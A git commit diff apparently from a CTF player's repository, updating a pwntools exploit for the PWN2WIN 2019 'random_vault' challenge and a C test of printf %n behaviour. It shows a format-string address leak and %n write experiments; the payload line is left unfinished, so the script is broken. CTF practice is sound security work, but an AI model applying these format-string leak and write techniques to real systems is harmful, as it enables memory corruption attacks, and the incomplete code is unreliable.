5ff6b090ab4d03d2ac652418f19460e3ea3966fe
Your Name <you@example.com>
2020-06-07 01:56:51 -0700

    t

--- PWN2WIN2019/random_vault/ex.py
+++ PWN2WIN2019/random_vault/ex.py
@@ -7,11 +7,25 @@ len_name = 0x51
 p.sendlineafter(': ', '%lx|'*11)
 
 offset_bss = 0x1750
-addr_base_bss = int(p.recvrepeat(1).split('|')[10], 16) - offset_bss
+offset_seed = 0x5008
+arr_leak = p.recvrepeat(1).split('|')
+
+addr_ret = int(arr_leak[6], 16) - 0x70 + 8
+addr_base_bss = int(arr_leak[10], 16) - offset_bss
+addr_seed = addr_base_bss + offset_seed
+
 
 log.info('base: ' + hex(addr_base_bss))
+log.info('seed: ' + hex(addr_seed))
+log.info('ret: ' + hex(addr_ret))
+
+raw_input('pid: ' + str(p.pid))
 
 
+payload = ''
+
+payload += 
+p.sendline(payload)
 
 p.interactive()
 
--- PWN2WIN2019/random_vault/test.cpp
+++ PWN2WIN2019/random_vault/test.cpp
@@ -1,7 +1,7 @@
 #include <stdio.h>
 
 int main(){
-	char buf[120]={0};
-	printf("%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx\n",1,2,3,4,5,6,7,8);
-	//printf("%x|%x|%x|%x|%x|\n");
+	int a, b, c;
+	printf("1234%n5678%n9abc%n\n", &a, &b, &c);
+	printf("%d\n%d\n%d\n", a, b, c);
 }
